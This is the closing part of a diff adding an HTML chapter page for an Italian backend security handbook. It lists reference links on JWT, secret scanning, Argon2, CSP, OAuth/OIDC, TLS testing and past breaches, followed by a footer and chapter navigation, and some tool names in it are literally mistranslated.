+                <a class="ref-link" href="https://jwt.io/" target="_blank">jwt.io (debugger JWT)</a>
+                <a class="ref-link" href="https://github.com/gitleaks/gitleaks" target="_blank">Gitleaks (segreto
+                    scanner)</a>
+                <a class="ref-link" href="https://pkg.go.dev/golang.org/x/crypto/argon2" target="_blank">Vai ad Argon2
+                    pacchetto</a>
+                <a class="ref-link" href="https://pypi.org/project/argon2-cffi/" target="_blank">Pitone
+                    argon2-cffi</a>
+                <a class="ref-link" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank">MDN, Politica di sicurezza dei contenuti</a>
+                <a class="ref-link" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies" target="_blank">
+                    MDN, cookie HTTP</a>
+                <a class="ref-link" href="https://oauth.net/2/" target="_blank">Specifica OAuth 2.0</a>
+                <a class="ref-link" href="https://openid.net/developers/how-connect-works/" target="_blank">OIDC
+                    Panoramica</a>
+                <a class="ref-link" href="https://pkg.go.dev/github.com/coreos/go-oidc/v3/oidc" target="_blank">Vai
+                    Biblioteca dell'OIDC</a>
+                <a class="ref-link" href="https://www.ssllabs.com/ssltest/" target="_blank">Tester TLS di SSL Labs</a>
+                <a class="ref-link" href="https://caddyserver.com/docs/automatic-https" target="_blank">Caddy
+                    HTTPS automatico</a>
+                <a class="ref-link" href="https://portswigger.net/burp/communitydownload" target="_blank">Suite Rutto
+                    Comunità</a>
+                <a class="ref-link" href="https://github.com/securego/gosec" target="_blank">gosec (Vai statico
+                    analisi)</a>
+                <a class="ref-link" href="https://www.cvedetails.com/cve/CVE-2017-5638/" target="_blank">
+                    CVE-2017-5638 (Equifax)</a>
+                <a class="ref-link" href="https://www.uber.com/newsroom/security-update/" target="_blank">Uber 2022
+                    Rapporto sulla violazione</a>
+                <a class="ref-link" href="https://blog.lastpass.com/2022/12/notice-of-recent-security-incident/"
+                    target="_blank">Avviso di violazione di LastPass</a>
+            </div>
+        </section>
+
+        <hr>
+        <p style="text-align:center;font-family:'Spline Sans', system-ui, sans-serif;font-size:13px;color:var(--ink-light);">
+            Manuale sul campo del backend / Sicurezza del backend / Capitolo 17 (esteso)
+        </p>
+
+    
+      <footer class="bfp-footer">Backend dai Primi Principi / Capitolo 17 / Sicurezza. Il codice è destinato a Go 1.22+ e Python 3.11+.</footer>
+</main>
+</div>
+<!-- CHAPTER NAVIGATION -->
+<nav class="chapter-nav" id="chapterNav">
+  <a href="../../16.Graceful Shutdown/html_notes/notes.html" class="nav-chapter-link"><span class="nav-arrow"><svg class="ico-arrow" width="15" height="15" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="13.5" y1="8" x2="3.5" y2="8"/><polyline points="7.5,4 3.5,8 7.5,12"/></svg></span><span class="nav-label"><span class="nav-small">Capitolo 16</span>Spegnimento grazioso</span></a>
+  <a href="../../index.html" class="nav-indicator"><span class="nav-dot"></span> Capitolo 17 <span class="nav-sep">/</span> 24</a>
+  <a href="../../18. Backend Scaling and Performance Engineering-part-1/html_notes/notes.html" class="nav-chapter-link nav-next"><span class="nav-label"><span class="nav-small">Capitolo 18</span>Scalabilità e prestazioni (Parte 1)</span><span class="nav-arrow"><svg class="ico-arrow" width="15" height="15" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="2.5" y1="8" x2="12.5" y2="8"/><polyline points="8.5,4 12.5,8 8.5,12"/></svg></span></a>
+</nav>
+  <script src="../../assets/copy-button.js"></script>
+  <script src="../../assets/enhancements.js"></script>
+<script src="../../assets/shell.js"></script>
+</body>
+
+</html>
